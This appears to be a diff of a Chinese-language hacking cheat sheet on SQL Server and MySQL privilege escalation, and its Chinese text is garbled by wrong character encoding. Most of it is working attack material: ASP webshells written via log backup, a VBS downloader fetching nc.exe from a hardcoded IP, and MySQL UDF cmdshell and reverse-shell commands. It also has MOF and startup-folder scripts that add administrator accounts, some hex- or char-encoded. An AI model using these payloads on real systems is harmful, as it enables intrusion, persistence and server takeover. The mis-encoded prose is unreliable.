+			exec sp_makewebtask 'WEBç»å¯¹è·¯å¾„/fuck.asp',' select ''<%25execute(request("a"))%25>'' ';--
+			P.S.(WEBä¸DATAåœ¨åŒä¸€ä¸»æœº,çŸ¥é“WEBç›®å½•)
+		4.å·¥å…·ææƒ
 		1>sqltools
-			Á¬½ÓÊı¾İ¿â
-			Ö´ĞĞÌáÈ¨cmdÃüÁî
+			è¿æ¥æ•°æ®åº“
+			æ‰§è¡Œææƒcmdå‘½ä»¤
 		
-		5.ÆäËûÌáÈ¨
-		ÏÂÔØÎÄ¼şµ½Ä¿±êÖ÷»ú·½Ê½:
-			ÀûÓÃNBSIµÈ¹¤¾ßĞ´ÈëVBSÎÄ¼ş
+		5.å…¶ä»–ææƒ
+		ä¸‹è½½æ–‡ä»¶åˆ°ç›®æ ‡ä¸»æœºæ–¹å¼:
+			åˆ©ç”¨NBSIç­‰å·¥å…·å†™å…¥VBSæ–‡ä»¶
 			echo Set xPost = CreateObject(^"Microsoft.XMLHTTP^"):xPost.Open ^"GET^",^"http://125.113.114.49/nc.exe^",0:xPost.Send():Set sGet = CreateObject(^"ADODB.Stream^"):sGet.Mode = 3:sGet.Type =1:sGet.Open():sGet.Write(xPost.responseBody):sGet.SaveToFile ^"c:/c.exe^",2 >c:/labeng.vbs
-			¸ÃÓï¾ä×÷ÓÃ:Ğ´Ò»¸öÃûÎªlabengµÄVBSÎÄ¼şµ½CÅÌ;
-			½Ó×ÅÖ´ĞĞCSCRIPT C:/LABENG.VBS;
-			VBSÎÄ¼ş×÷ÓÃ:ÏÂÔØhttp://125.113.114.49/nc.exeµ½C:/C.EXE;
+			è¯¥è¯­å¥ä½œç”¨:å†™ä¸€ä¸ªåä¸ºlabengçš„VBSæ–‡ä»¶åˆ°Cç›˜;
+			æ¥ç€æ‰§è¡ŒCSCRIPT C:/LABENG.VBS;
+			VBSæ–‡ä»¶ä½œç”¨:ä¸‹è½½http://125.113.114.49/nc.exeåˆ°C:/C.EXE;
 
-		FTP&TFTP´«Êä:
+		FTP&TFTPä¼ è¾“:
 			FTP:
-			CMDLINEÒÀ´ÎÊäÈë
+			CMDLINEä¾æ¬¡è¾“å…¥
 				ECHO FTP>FTP.TXT
 				ECHO OPEN 125.*.*.*>>FTP.TXT
 				ECHO USERNAME>>FTP.TXT
 				ECHIO PASSWORD>>FTP.TXT
 				ECHO GET XX.EXE>>FTP.TXT
 				ECHO BYE>>FTP.TXT
-			×÷ÓÃ:Ğ´Ò»¸öFTP.TXTÎÄ¼ş,ÄÚÈİÎª
+			ä½œç”¨:å†™ä¸€ä¸ªFTP.TXTæ–‡ä»¶,å†…å®¹ä¸º
 				FTP
 				OPEN 125.*.*.*
 				USERNAME
 				PASSWORD
 				GET XX.EXE
 				BYE
-			½Ó×ÅÖ´ĞĞ:
+			æ¥ç€æ‰§è¡Œ:
 				FTP -S:FTP.TXT
-			Ä¿±êÖ÷»ú¾Í»áµ½125.*.*.*ÏÂÔØXX.EXE;
-			TFTPÀàËÆ~~
+			ç›®æ ‡ä¸»æœºå°±ä¼šåˆ°125.*.*.*ä¸‹è½½XX.EXE;
+			TFTPç±»ä¼¼~~
 
-			DBÈ¨ÏŞ:
-			WEB&DATAÍ¬Ò»Ö÷»ú:1,ÁĞÄ¿Â¼ÕÒµ½WEBÄ¿Â¼,LOG»ò²îÒì±¸·İÄÃWEBSHELL,½Ó×ÅÌáÈ¨,2,²Â±íÄÃ¹ÜÀíÔ±IDºÍÃÜÂë,½øºóÌ¨ÄÃWEBSHELL..3,±¸·İÌáÈ¨Óï¾äµ½Æô¶¯Ïî,µÈ´ıÖØÆğ
-			·ÖÀëµÄÇé¿ö:1,²Â±íÄÃ¹ÜÀíÔ±IDºÍÃÜÂë,½øºóÌ¨ÄÃWEBSHELL..2,±¸·İÌáÈ¨Óï¾äµ½Æô¶¯Ïî,µÈ´ıÖØÆğ.
+			DBæƒé™:
+			WEB&DATAåŒä¸€ä¸»æœº:1,åˆ—ç›®å½•æ‰¾åˆ°WEBç›®å½•,LOGæˆ–å·®å¼‚å¤‡ä»½æ‹¿WEBSHELL,æ¥ç€ææƒ,2,çŒœè¡¨æ‹¿ç®¡ç†å‘˜IDå’Œå¯†ç ,è¿›åå°æ‹¿WEBSHELL..3,å¤‡ä»½ææƒè¯­å¥åˆ°å¯åŠ¨é¡¹,ç­‰å¾…é‡èµ·
+			åˆ†ç¦»çš„æƒ…å†µ:1,çŒœè¡¨æ‹¿ç®¡ç†å‘˜IDå’Œå¯†ç ,è¿›åå°æ‹¿WEBSHELL..2,å¤‡ä»½ææƒè¯­å¥åˆ°å¯åŠ¨é¡¹,ç­‰å¾…é‡èµ·.
 
-			ÅĞ¶ÏDATAÖ÷»úIP:
-			±¾µØNC -L -V -P 1433 ¼àÌı1433¶Ë¿Ú
-			;insert into opendatasource('sqloledb','server=×Ô¼ºµÄIP;uid=test;pwd=test; database=test').test.dbo.ku select name from master.dbo.sysdatabases--
+			åˆ¤æ–­DATAä¸»æœºIP:
+			æœ¬åœ°NC -L -V -P 1433 ç›‘å¬1433ç«¯å£
+			;insert into opendatasource('sqloledb','server=è‡ªå·±çš„IP;uid=test;pwd=test; database=test').test.dbo.ku select name from master.dbo.sysdatabases--
 
-			±©WEBÂ·¾¶(PS:DATA&WEBÍ¬Ò»Ö÷»ú)
+			æš´WEBè·¯å¾„(PS:DATA&WEBåŒä¸€ä¸»æœº)
 			;create table labeng(lala nvarchar(255), null)--
 			;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM/ControlSet001/Services/W3SVC/Parameters/Virtual Roots','/',@result output insert into labeng (lala) values(@result);--
-			;and 1=(select count(*) from labeng where lala>1)-- »òÕß ;and 1=(selet top 1 lala from labeng)--
+			;and 1=(select count(*) from labeng where lala>1)-- æˆ–è€… ;and 1=(selet top 1 lala from labeng)--
 
-			¹ıÂË'µÄ´¦Àí:
-			;DECLARE @S VARCHAR(4000);SET @S=CAST(SQLÓï¾äµÄÊ®Áù½øÖÆÊı AS VARCHAR(4000));EXEC(@S)--
+			è¿‡æ»¤'çš„å¤„ç†:
+			;DECLARE @S VARCHAR(4000);SET @S=CAST(SQLè¯­å¥çš„åå…­è¿›åˆ¶æ•° AS VARCHAR(4000));EXEC(@S)--
 
-			LOG±¸·İÓï¾ä:
-			;alter database ±í set RECOVERY FULL--
+			LOGå¤‡ä»½è¯­å¥:
+			;alter database è¡¨ set RECOVERY FULL--
 			;create table cmd (a image)--
-			;backup log ±í to disk = 'c:/Sammy' with init--
+			;backup log è¡¨ to disk = 'c:/Sammy' with init--
 			;insert into cmd (a) values ('<%%25Execute(request("value"))%%25>')--
-			;backup log ±í to disk = 'WEBÄ¿Â¼/1.asp'--
+			;backup log è¡¨ to disk = 'WEBç›®å½•/1.asp'--
 
-			Ò»¾ä»°±äĞÎ:
+			ä¸€å¥è¯å˜å½¢:
 			a).<%%25Execute(request("go"))%%25>
 			b).<%Execute(request("go"))%>
 			c).%><%execute request("go")%><%
 			d).<script language=VBScript runat=server>execute request("sb")</Script>
 			e).<%25Execute(request("l"))%25>
 
-			±¸·İÎÄ¼şµ½Æô¶¯Ïî:
-			½«LOG±¸·İÖĞ'<%%25Execute(request("value"))%%25>'¸ÄÎªHTA.BATµÈÎÄ¼şµÄÊ®Áù½øÖÆÄÚÈİ
+			å¤‡ä»½æ–‡ä»¶åˆ°å¯åŠ¨é¡¹:
+			å°†LOGå¤‡ä»½ä¸­'<%%25Execute(request("value"))%%25>'æ”¹ä¸ºHTA.BATç­‰æ–‡ä»¶çš„åå…­è¿›åˆ¶å†…å®¹
 
-			Àı:labeng.hta
-			ÄÚÈİ:
+			ä¾‹:labeng.hta
+			å†…å®¹:
 			<SCRIPT LANGUAGE="VBScript">
 			on error resume next
 			Set WS = createobject("WScript.Shell")
@@ -319,14 +319,14 @@ hashÆÆ½âÍøÖ·
 			</script>
 			<script language=javascript>window.close();</script>
 			-----------------------------------------------------------------------------
-			×ª»¯ÎªÊ®Áù½øÖÆ:
+			è½¬åŒ–ä¸ºåå…­è¿›åˆ¶:
 			0x3C534352495054204C414E47554147453D225642536372697074223E0D0A6F6E206572726F7220726573756D65206E6578740D0A536574205753203D206372656174656F626A6563742822575363726970742E5368656C6C22290D0A57532E72756E2022636D64202F63206E6574312E6578652075736572207465737424206C6162656E673F313233202F6164642026206E6574312E657865206C6F63616C67726F75702061646D696E6973747261746F7273207465737424202F61646420262064656C206C6162656E672E687461222C300D0A3C2F7363726970743E3C736372697074206C616E67756167653D6A6176617363726970743E77696E646F772E636C6F736528293B3C2F7363726970743E0D0A0D0A0D0A
 			-----------------------------------------------------------------------------
-			SQLÓï¾ä:
+			SQLè¯­å¥:
 			;insert into cmd (a) values(0x3C534352495054204C414E47554147453D225642536372697074223E0D0A6F6E206572726F7220726573756D65206E6578740D0A536574205753203D206372656174656F626A6563742822575363726970742E5368656C6C22290D0A57532E72756E2022636D64202F63206E6574312E6578652075736572207465737424206C6162656E673F313233202F6164642026206E6574312E657865206C6F63616C67726F75702061646D696E6973747261746F7273207465737424202F61646420262064656C206C6162656E672E687461222C300D0A3C2F7363726970743E3C736372697074206C616E67756167653D6A6176617363726970743E77696E646F772E636C6F736528293B3C2F7363726970743E0D0A0D0A0D0A)--
 
 			------------------------------------------------------------------------------------
-			ÌáÉıSQLÓÃ»§ÎªSAÈ¨ÏŞ:
+			æå‡SQLç”¨æˆ·ä¸ºSAæƒé™:
 			<SCRIPT LANGUAGE="VBScript">
 			on error resume next
 			Set WS = createobject("WScript.Shell")
@@ -336,78 +336,78 @@ hashÆÆ½âÍøÖ·
 			</script>
 			<script language=javascript>window.close();</script>	
 	}
-	mysqlÌáÈ¨£º
+	mysqlææƒï¼š
 	{
-		1.UDFÌáÈ¨
+		1.UDFææƒ
 		{
-			1>´óÂíµ¼³öudfÌáÈ¨£º
-				ÉÏ´«udfÎÄ¼şÖÁ¿É¶ÁĞ´Ä¿Â¼:
-				5.1¼°ÒÔÏÂ°æ±¾
+			1>å¤§é©¬å¯¼å‡ºudfææƒï¼š
+				ä¸Šä¼ udfæ–‡ä»¶è‡³å¯è¯»å†™ç›®å½•:
+				5.1åŠä»¥ä¸‹ç‰ˆæœ¬
 					select @@basedir;  
-					select load_file('C:\\Inetpub\\wwwroot\\udf32.dll') into dumpfile 'c:\\windows\\system32\\udf.dll' //µÍ°æ±¾5.0ÒÔÏÂ
-					select load_file('C:\\Inetpub\\wwwroot\\udf32.dll') into dumpfile 'c:\\windows\\udf.dll' //µÍ°æ±¾5.0ÒÔÏÂ
-				5.1ÒÔÉÏ°æ±¾
+					select load_file('C:\\Inetpub\\wwwroot\\udf32.dll') into dumpfile 'c:\\windows\\system32\\udf.dll' //ä½ç‰ˆæœ¬5.0ä»¥ä¸‹
+					select load_file('C:\\Inetpub\\wwwroot\\udf32.dll') into dumpfile 'c:\\windows\\udf.dll' //ä½ç‰ˆæœ¬5.0ä»¥ä¸‹
+				5.1ä»¥ä¸Šç‰ˆæœ¬
 					select @@plugin_dir
-					select load_file('C:\\?\\udf32.dll') into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll' //¸ß°æ±¾5.0ÒÔÉÏ
+					select load_file('C:\\?\\udf32.dll') into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll' //é«˜ç‰ˆæœ¬5.0ä»¥ä¸Š
 
-				NTFS ADSÎÄ¼şÁ÷µ¼³ödllÎÄ¼şµ½pluginÎÄ¼ş¼Ğ
-					½â¾öCan't open shared libraryµÄÇé¿ö£¬ÕâÊ±¾ÍĞèÒªÎÒÃÇ°Ñudf.dllµ¼³öµ½lib\pluginÄ¿Â¼ÏÂ²Å¿ÉÒÔ£¬µ«ÊÇÄ¬ÈÏÇé¿öÏÂplugin²»´æÔÚ
-					//²éÕÒµ½mysqlµÄÄ¿Â¼
+				NTFS ADSæ–‡ä»¶æµå¯¼å‡ºdllæ–‡ä»¶åˆ°pluginæ–‡ä»¶å¤¹
+					è§£å†³Can't open shared libraryçš„æƒ…å†µï¼Œè¿™æ—¶å°±éœ€è¦æˆ‘ä»¬æŠŠudf.dllå¯¼å‡ºåˆ°lib\pluginç›®å½•ä¸‹æ‰å¯ä»¥ï¼Œä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹pluginä¸å­˜åœ¨
+					//æŸ¥æ‰¾åˆ°mysqlçš„ç›®å½•
 					select 'dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';  
-					//ÀûÓÃNTFS ADS´´½¨libÄ¿Â¼
+					//åˆ©ç”¨NTFS ADSåˆ›å»ºlibç›®å½•
 					select 'dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';
-					//ÀûÓÃNTFS ADS´´½¨pluginÄ¿Â¼		
-				cmdshellÃüÁî:
+					//åˆ©ç”¨NTFS ADSåˆ›å»ºpluginç›®å½•		
+				cmdshellå‘½ä»¤:
 					create function cmdshell returns string soname 'moonudf.dll'
-					select cmdshell('ÃüÁî')
-					select backshell('ÄãµÄip',12345)
+					select cmdshell('å‘½ä»¤')
+					select backshell('ä½ çš„ip',12345)
 					nc -l -p 12345 
 			
-			2>ÌáÈ¨½Å±¾ÌáÈ¨
-				ÉÏ´«ÌáÈ¨½Å±¾£¬µ¼³öudfÎÄ¼ş£¬´´½¨cmdshell,Ö´ĞĞselect cmdshell('ÌáÈ¨ÃüÁî');
+			2>ææƒè„šæœ¬ææƒ
+				ä¸Šä¼ ææƒè„šæœ¬ï¼Œå¯¼å‡ºudfæ–‡ä»¶ï¼Œåˆ›å»ºcmdshell,æ‰§è¡Œselect cmdshell('ææƒå‘½ä»¤');
 				MYSQL=>5.1
-					ÓÃ select @@plugin_dir ²éÑ¯pluginÂ·¾¶
-					µ¼³öÂ·¾¶£º%mysql%\\plugin\\udf.dll   
-				MYSQL<=5.0Ä¬ÈÏÎªÏµÍ³Ä¿Â¼
-					C:\\WINDOWS\\udf.dll    »ò    C:\\WINDOWS\\system32\\udf.dll
-				Ä¬ÈÏudf×Ô´øº¯Êı:
-					cmdshell Ö´ĞĞcmd;
-					downloader ÏÂÔØÕß,µ½ÍøÉÏÏÂÔØÖ¸¶¨ÎÄ¼ş²¢±£´æµ½Ö¸¶¨Ä¿Â¼;
-					open3389 Í¨ÓÃ¿ª3389ÖÕ¶Ë·şÎñ,¿ÉÖ¸¶¨¶Ë¿Ú(²»¸Ä¶Ë¿ÚÎŞĞèÖØÆô);
-					backshell ·´µ¯Shell;
-					ProcessView Ã¶¾ÙÏµÍ³½ø³Ì;
-					KillProcess ÖÕÖ¹Ö¸¶¨½ø³Ì;
-					regread ¶Á×¢²á±í;
-					regwrite Ğ´×¢²á±í;
-					shut ¹Ø»ú,×¢Ïú,ÖØÆô;
-					about ËµÃ÷Óë°ïÖúº¯Êı;
-				ËµÃ÷£º
-					Ä¬ÈÏÌí¼Ó¹ÜÀíÔ±ÕËºÅ ÃÜÂë123456
-					Ä¬ÈÏ·´µ¯¶Ë¿Ú12345
-					²»ÒªËæ±ãÉ¾³ı¸Õ´´½¨µÄº¯Êı ÖØĞÂÉúĞ§ÒªmysqlÖØÆô
-					±ğÈËµÄudf Çë×ÔĞĞ¿´±ğÈËµÄudfËµÃ÷
-				³£ÓÃÃüÁî
+					ç”¨ select @@plugin_dir æŸ¥è¯¢pluginè·¯å¾„
+					å¯¼å‡ºè·¯å¾„ï¼š%mysql%\\plugin\\udf.dll   
+				MYSQL<=5.0é»˜è®¤ä¸ºç³»ç»Ÿç›®å½•
+					C:\\WINDOWS\\udf.dll    æˆ–    C:\\WINDOWS\\system32\\udf.dll
+				é»˜è®¤udfè‡ªå¸¦å‡½æ•°:
+					cmdshell æ‰§è¡Œcmd;
+					downloader ä¸‹è½½è€…,åˆ°ç½‘ä¸Šä¸‹è½½æŒ‡å®šæ–‡ä»¶å¹¶ä¿å­˜åˆ°æŒ‡å®šç›®å½•;
+					open3389 é€šç”¨å¼€3389ç»ˆç«¯æœåŠ¡,å¯æŒ‡å®šç«¯å£(ä¸æ”¹ç«¯å£æ— éœ€é‡å¯);
+					backshell åå¼¹Shell;
+					ProcessView æšä¸¾ç³»ç»Ÿè¿›ç¨‹;
+					KillProcess ç»ˆæ­¢æŒ‡å®šè¿›ç¨‹;
+					regread è¯»æ³¨å†Œè¡¨;
+					regwrite å†™æ³¨å†Œè¡¨;
+					shut å…³æœº,æ³¨é”€,é‡å¯;
+					about è¯´æ˜ä¸å¸®åŠ©å‡½æ•°;
+				è¯´æ˜ï¼š
+					é»˜è®¤æ·»åŠ ç®¡ç†å‘˜è´¦å· å¯†ç 123456
+					é»˜è®¤åå¼¹ç«¯å£12345
+					ä¸è¦éšä¾¿åˆ é™¤åˆšåˆ›å»ºçš„å‡½æ•° é‡æ–°ç”Ÿæ•ˆè¦mysqlé‡å¯
+					åˆ«äººçš„udf è¯·è‡ªè¡Œçœ‹åˆ«äººçš„udfè¯´æ˜
+				å¸¸ç”¨å‘½ä»¤
 					create function cmdshell returns string soname 'moonudf.dll'
-					select cmdshell('ÃüÁî')
-					select backshell('ÄãµÄip',12345)
+					select cmdshell('å‘½ä»¤')
+					select backshell('ä½ çš„ip',12345)
 					nc -l -p 12345 
-			3>ÌáÈ¨¹¤¾ßÌáÈ¨
+			3>ææƒå·¥å…·ææƒ
 				sqltools
-				ĞèÒªÊı¾İ¿âÔÊĞíÍâÁª£¬ÌáÈ¨¹¤¾ßµÇÂ¼Êı¾İ¿â£¬Ö´ĞĞÉÏ´«udf£¬×¢ÒâÉÏ´«Â·¾¶ÎÊÌâ£¬Ö´ĞĞselect cmdshellÃüÁî
+				éœ€è¦æ•°æ®åº“å…è®¸å¤–è”ï¼Œææƒå·¥å…·ç™»å½•æ•°æ®åº“ï¼Œæ‰§è¡Œä¸Šä¼ udfï¼Œæ³¨æ„ä¸Šä¼ è·¯å¾„é—®é¢˜ï¼Œæ‰§è¡Œselect cmdshellå‘½ä»¤
 				
-			4>²Ëµ¶ÌáÈ¨
-			²Ëµ¶ÅäÖÃÁ¬½ÓÊı¾İ¿â£¬Ö´ĞĞsqlÓï¾äµ¼ÈëUDFÎÄ¼ş£¬´´½¨CMDSHELLº¯Êı£¬Ö´ĞĞcmdÃüÁî
+			4>èœåˆ€ææƒ
+			èœåˆ€é…ç½®è¿æ¥æ•°æ®åº“ï¼Œæ‰§è¡Œsqlè¯­å¥å¯¼å…¥UDFæ–‡ä»¶ï¼Œåˆ›å»ºCMDSHELLå‡½æ•°ï¼Œæ‰§è¡Œcmdå‘½ä»¤
 				C:\ProgramData\udf64.dll   
 				C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin\
-				load_file£¬into dumpfile
+				load_fileï¼Œinto dumpfile
 				Select load_file('C:/ProgramData/udf64.dll') into dumpfile 'C:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/testudf.dll'
 				create function cmdshell returns string soname 'testudf.dll';
-				select cmdshell('ÃüÁî')
+				select cmdshell('å‘½ä»¤')
 		}
-		2.MOFÌáÈ¨
+		2.MOFææƒ
 		{
-			ÕÒ¸ö¿ÉĞ´Ä¿Â¼£¬ÎÒÕâÀïÊÇC:\recycler\£¬°ÑpayloadĞ´µ½nullevt.mofÎÄ¼şÀï
-			²Ëµ¶¡¢´óÂíÁ¬½ÓÊı¾İ¿âºó£¬select load_file('C:\\RECYCLER\\nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
+			æ‰¾ä¸ªå¯å†™ç›®å½•ï¼Œæˆ‘è¿™é‡Œæ˜¯C:\recycler\ï¼ŒæŠŠpayloadå†™åˆ°nullevt.mofæ–‡ä»¶é‡Œ
+			èœåˆ€ã€å¤§é©¬è¿æ¥æ•°æ®åº“åï¼Œselect load_file('C:\\RECYCLER\\nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
 			payload:
 			{
 				#pragma namespace("\\\\.\\root\\subscription") 
@@ -434,20 +434,20 @@ hashÆÆ½âÍøÖ·
 					Filter = $EventFilter; 
 				};
 			}
-			mofÌáÈ¨·À»¤°ì·¨£º
+			mofææƒé˜²æŠ¤åŠæ³•ï¼š
 			{
-				·¨1£º
-					net stop winmgmt //Í£Ö¹·şÎñ
-					DEL D:\aaaaa\*.*  »ò  RD /S D:\aaaaa	//É¾³ıÎÄ¼ş¼Ğ£ºC:\WINDOWS\system32\wbem\Repository
-				 	net start winmgmt //Æô¶¯·şÎñ
-				·¨2£ºÔÚsqlÖĞÖ´ĞĞÒÔÏÂ´úÂë£¬Ğ§¹ûÊÇÒ»ÑùµÄ
+				æ³•1ï¼š
+					net stop winmgmt //åœæ­¢æœåŠ¡
+					DEL D:\aaaaa\*.*  æˆ–  RD /S D:\aaaaa	//åˆ é™¤æ–‡ä»¶å¤¹ï¼šC:\WINDOWS\system32\wbem\Repository
+				 	net start winmgmt //å¯åŠ¨æœåŠ¡
+				æ³•2ï¼šåœ¨sqlä¸­æ‰§è¡Œä»¥ä¸‹ä»£ç ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„
 					select char(35,112,114,97,103,109,97,32,110,97,109,101,115,112,97,99,101,40,34,92,92,92,92,46,92,92,114,111,111,116,92,92,115,117,98,115,99,114,105,112,116,105,111,110,34,41,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,95,95,69,118,101,110,116,70,105,108,116,101,114,32,97,115,32,36,69,118,101,110,116,70,105,108,116,101,114,13,10,123,13,10,32,32,32,32,69,118,101,110,116,78,97,109,101,115,112,97,99,101,32,61,32,34,82,111,111,116,92,92,67,105,109,118,50,34,59,13,10,32,32,32,32,78,97,109,101,32,32,61,32,34,102,105,108,116,80,50,34,59,13,10,32,32,32,32,81,117,101,114,121,32,61,32,34,83,101,108,101,99,116,32,42,32,70,114,111,109,32,95,95,73,110,115,116,97,110,99,101,77,111,100,105,102,105,99,97,116,105,111,110,69,118,101,110,116,32,34,13,10,32,32,32,32,32,32,32,32,32,32,32,32,34,87,104,101,114,101,32,84,97,114,103,101,116,73,110,115,116,97,110,99,101,32,73,115,97,32,92,34,87,105,110,51,50,95,76,111,99,97,108,84,105,109,101,92,34,32,34,13,10,32,32,32,32,32,32,32,32,32,32,32,32,34,65,110,100,32,84,97,114,103,101,116,73,110,115,116,97,110,99,101,46,83,101,99,111,110,100,32,61,32,53,34,59,13,10,32,32,32,32,81,117,101,114,121,76,97,110,103,117,97,103,101,32,61,32,34,87,81,76,34,59,13,10,125,59,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,65,99,116,105,118,101,83,99,114,105,112,116,69,118,101,110,116,67,111,110,115,117,109,101,114,32,97,115,32,36,67,111,110,115,117,109,101,114,13,10,123,13,10,32,32,32,32,78,97,109,101,32,61,32,34,99,111,110,115,80,67,83,86,50,34,59,13,10,32,32,32,32,83,99,114,105,112,116,105,110,103,69,110,103,105,110,101,32,61,32,34,74,83,99,114,105,112,116,34,59,13,10,32,32,32,32,83,99,114,105,112,116,84,101,120,116,32,61,13,10,32,32,32,32,34,118,97,114,32,87,83,72,32,61,32,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,92,34,87,83,99,114,105,112,116,46,83,104,101,108,108,92,34,41,92,110,87,83,72,46,114,117,110,40,92,34,110,101,116,46,101,120,101,32,108,111,99,97,108,103,114,111,117,112,32,97,100,109,105,110,105,115,116,114,97,116,111,114,115,32,97,100,109,105,110,32,47,97,100,100,92,34,41,34,59,13,10,32,125,59,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,95,95,70,105,108,116,101,114,84,111,67,111,110,115,117,109,101,114,66,105,110,100,105,110,103,13,10,123,13,10,32,32,32,32,67,111,110,115,117,109,101,114,32,32,32,61,32,36,67,111,110,115,117,109,101,114,59,13,10,32,32,32,32,70,105,108,116,101,114,32,61,32,36,69,118,101,110,116,70,105,108,116,101,114,59,13,10,125,59) into dumpfile  'c:/windows/system32/wbem/mof/nullevt.mof';  
 			}
 		}
-		3.Æô¶¯ÏîÌáÈ¨
+		3.å¯åŠ¨é¡¹ææƒ
 		{
-			ÉÏ´«Â·¾¶ C:\\Documents and Settings\\All Users\\¡¸¿ªÊ¼¡¹²Ëµ¥\\³ÌĞò\\Æô¶¯\\add.vbs,ÏµÍ³ÖØĞÂÆô¶¯ºóÖ´ĞĞadd.vbs
-			select load_file('C:\\Inetpub\\wwwroot\\add.vbs') into dumpfile 'C:\\Documents and Settings\\All Users\\¡¸¿ªÊ¼¡¹²Ëµ¥\\³ÌĞò\\Æô¶¯\\add.vbs'
+			ä¸Šä¼ è·¯å¾„ C:\\Documents and Settings\\All Users\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨\\add.vbs,ç³»ç»Ÿé‡æ–°å¯åŠ¨åæ‰§è¡Œadd.vbs
+			select load_file('C:\\Inetpub\\wwwroot\\add.vbs') into dumpfile 'C:\\Documents and Settings\\All Users\\ã€Œå¼€å§‹ã€èœå•\\ç¨‹åº\\å¯åŠ¨\\add.vbs'
 			add.vbs:
 			{
 				set wsnetwork=CreateObject("WSCRIPT.NETWORK")
@@ -460,87 +460,87 @@ hashÆÆ½âÍøÖ·
 				Set of=GetObject(os&"/web",user)
 				oe.add os&"/web"
 			}
-			ÀûÓÃSQLÃüÁîÀ´½øĞĞVBS½Å±¾µÄ´´½¨¼°Ìí¼Ó¡£
+			åˆ©ç”¨SQLå‘½ä»¤æ¥è¿›è¡ŒVBSè„šæœ¬çš„åˆ›å»ºåŠæ·»åŠ ã€‚
 				create table secist(cmd text);
-				insert into secist values(¡°set wshshell=createobject(¡°¡±wscript.shell¡±¡±)¡±);
-				insert into secist values(¡°a=wshshell.run(¡°¡±cmd.exe /c net user secist secist.com /add¡°¡±,0)¡±);
-				insert into secist values(¡°b=wshshell.run(¡°¡±cmd.exe /c net localgroup administrators secist /add¡°¡±,0)¡±);
-				select * from secist into dumpfile ¡°C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌĞò\Æô¶¯\secist.vbs¡±;
+				insert into secist values(â€œset wshshell=createobject(â€œâ€wscript.shellâ€â€)â€);
+				insert into secist values(â€œa=wshshell.run(â€œâ€cmd.exe /c net user secist secist.com /addâ€œâ€,0)â€);
+				insert into secist values(â€œb=wshshell.run(â€œâ€cmd.exe /c net localgroup administrators secist /addâ€œâ€,0)â€);
+				select * from secist into dumpfile â€œC:\Documents and Settings\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨\secist.vbsâ€;
 		
-		4.´óÂíÖ±½ÓÌáÈ¨£¨±¾ÖÊÊÇUDFÌáÈ¨£©
-			Á¬½ÓÊı¾İ¿â£¬°²×°dllÎÄ¼ş£¬Ö´ĞĞÌáÈ¨ÃüÁî
+		4.å¤§é©¬ç›´æ¥ææƒï¼ˆæœ¬è´¨æ˜¯UDFææƒï¼‰
+			è¿æ¥æ•°æ®åº“ï¼Œå®‰è£…dllæ–‡ä»¶ï¼Œæ‰§è¡Œææƒå‘½ä»¤
 		
-		5.Êı¾İ¿â·´µ¯¶Ë¿ÚÁ¬½ÓÌáÈ¨
-			¼ÙÈçÎÒÃÇÉ¨µ½ÁËÒ»¸ömysqlµÄrootÈõÃÜÂë£¬²¢ÇÒ¿ÉÒÔÍâÁ¬£¬µ«ÊÇ·şÎñÆ÷ÉÏÃæµÄÍøÕ¾ÓÖÎŞ·¨Getshell£¬ÕâÊ±ÎÒÃÇÔõÃ´°ìÄØ£¿
-				1>ÀûÓÃmysql¿Í»§¶Ë¹¤¾ßÁ¬½Ómysql·şÎñÆ÷£¬È»ºóÖ´ĞĞÏÂÃæµÄ²Ù×÷¡£
+		5.æ•°æ®åº“åå¼¹ç«¯å£è¿æ¥ææƒ
+			å‡å¦‚æˆ‘ä»¬æ‰«åˆ°äº†ä¸€ä¸ªmysqlçš„rootå¼±å¯†ç ï¼Œå¹¶ä¸”å¯ä»¥å¤–è¿ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸Šé¢çš„ç½‘ç«™åˆæ— æ³•Getshellï¼Œè¿™æ—¶æˆ‘ä»¬æ€ä¹ˆåŠå‘¢ï¼Ÿ
+				1>åˆ©ç”¨mysqlå®¢æˆ·ç«¯å·¥å…·è¿æ¥mysqlæœåŠ¡å™¨ï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„æ“ä½œã€‚
 					mysql.exe -h 172.16.10.11 -uroot -p
 					Enter password:
 					mysql> \. c:\mysql.txt
 					mysql>select backshell("YourIP",2010);
-				2>±¾µØ¼àÌıÄã·´µ¯µÄ¶Ë¿Ú
+				2>æœ¬åœ°ç›‘å¬ä½ åå¼¹çš„ç«¯å£
 					nc.exe -vv -l -p 2010
-				³É¹¦ºó£¬Äã½«»ñµÃÒ»¸ösystemÈ¨ÏŞµÄcmdshell£¬ÆäÊµÕâ¸öÒ²ÊÇÀûÓÃµÄUDFÌáÈ¨
-		6.Êı¾İ¿â¹ÜÀíÔ±ÕËºÅÃÜÂëµÄ»ñÈ¡
+				æˆåŠŸåï¼Œä½ å°†è·å¾—ä¸€ä¸ªsystemæƒé™çš„cmdshellï¼Œå…¶å®è¿™ä¸ªä¹Ÿæ˜¯åˆ©ç”¨çš„UDFææƒ
+		6.æ•°æ®åº“ç®¡ç†å‘˜è´¦å·å¯†ç çš„è·å–
 		{
-			1>ÅäÖÃÎÄ¼şĞ¹Â¶
+			1>é…ç½®æ–‡ä»¶æ³„éœ²
 			{
 				config.inc
 				web.config
 			}
